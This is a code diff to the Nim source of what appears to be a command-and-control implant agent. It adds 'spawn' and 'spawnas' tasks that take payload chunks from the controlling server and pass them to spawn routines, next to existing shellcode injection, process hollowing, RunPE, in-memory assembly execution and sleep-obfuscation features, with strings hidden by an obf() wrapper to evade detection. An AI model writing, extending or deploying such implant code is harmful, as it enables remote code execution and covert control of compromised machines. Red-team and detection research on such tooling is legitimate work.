@@ -73,6 +73,9 @@ when defined(windows):
   import tasks/inject_hollow
   import tasks/run_pe
   import tasks/powershell_import
+  import tasks/sc
+  import tasks/spawn
+  import tasks/spawnas
 
 when defined(windows):
   when defined(sleepObfuscationEkko):
@@ -80,7 +83,7 @@ when defined(windows):
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport, btSpawn, btSpawnAs
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -652,6 +655,32 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           )
           agent.backgroundTasks[taskId] = state
       
+      of obf("spawn"):
+        when defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btSpawn,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
+      of obf("spawnas"):
+        when defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btSpawnAs,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
       of obf("screenshot"):
         when defined(windows):
           # Screenshot doesn't use BackgroundTaskState, handled elsewhere
@@ -1058,6 +1087,48 @@ proc postResponses*(agent: var Agent) =
                   if runpeResp.hasKey(obf("completed")) and runpeResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] RunPE complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btSpawn:
+              when defined(windows):
+                # Process incoming file chunks for spawn payload
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let spawnResp = processSpawnChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(spawnResp)
+                  
+                  if spawnResp.hasKey(obf("completed")) and spawnResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] Spawn complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btSpawnAs:
+              when defined(windows):
+                # Process incoming file chunks for spawnas payload
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let spawnasResp = processSpawnAsChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(spawnasResp)
+                  
+                  if spawnasResp.hasKey(obf("completed")) and spawnasResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] SpawnAs complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
